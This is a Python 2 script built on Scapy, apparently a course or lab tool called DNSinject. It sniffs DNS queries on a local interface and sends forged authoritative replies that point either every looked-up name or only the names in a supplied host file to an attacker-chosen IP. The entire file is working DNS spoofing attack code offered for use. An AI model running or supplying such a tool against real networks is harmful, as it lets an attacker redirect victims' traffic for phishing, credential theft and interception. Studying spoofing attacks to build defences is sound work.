import argparse
from scapy.all import *
import sys
from scapy.layers.dns import DNSRR, DNS, DNSQR
from scapy.layers.inet import IP, UDP
import fcntl
import struct


def get_arguments():
    parser = argparse.ArgumentParser(add_help=False,
                                     description="DNSinject to send spoofed responses")
    parser.add_argument("-i", '--interface', default="ens33")
    parser.add_argument("-h", '--hostnames')
    parser.add_argument('expression', nargs='*')
    parser.add_argument('-help', '--help', action="store_true",
                        help=argparse.SUPPRESS)
    args = parser.parse_args()
    if args.help:
        parser.print_help()
        sys.exit()
    return args.interface, args.hostnames, args.expression


if os.name != "nt":
    def get_interface_ip(ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s',
                                                                            ifname[:15]))[20:24])


def dns_inject(packet):
    val = ''
    if packet.haslayer(DNSQR):
        if hostmap is None or len(hostmap) == 0:
            val = ip
        elif packet[DNSQR].qname not in hostmap.keys():
            return
        else:
            val = hostmap[packet[DNSQR].qname]
        if val is not None:
            forged_packet = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                            DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
                                an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=val))
            if packet[DNS].ancount == 0:
                send(forged_packet)


if __name__ == '__main__':
    interface, filename, bpf = get_arguments()
    hostmap = {}
    print interface
    print filename
    bpf_expr = ''
    if bpf:
        print bpf
        for s in bpf:
            bpf_expr = bpf_expr + s + ' '
    print bpf_expr
    if filename is not None:
        with open(filename) as fp:
            for line in fp:
                print(line)
                values = line.split(" ")
                print(values)
                print(values[1])
                if values[1].endswith('\n'):
                    hostmap[values[1][:-1] + '.'] = values[0]
                else:
                    hostmap[values[1] + '.'] = values[0]
    print hostmap
    ip = get_interface_ip(interface)
    print(ip)

    sniff(filter='udp port 53', iface=interface, store=0, prn=dns_inject)
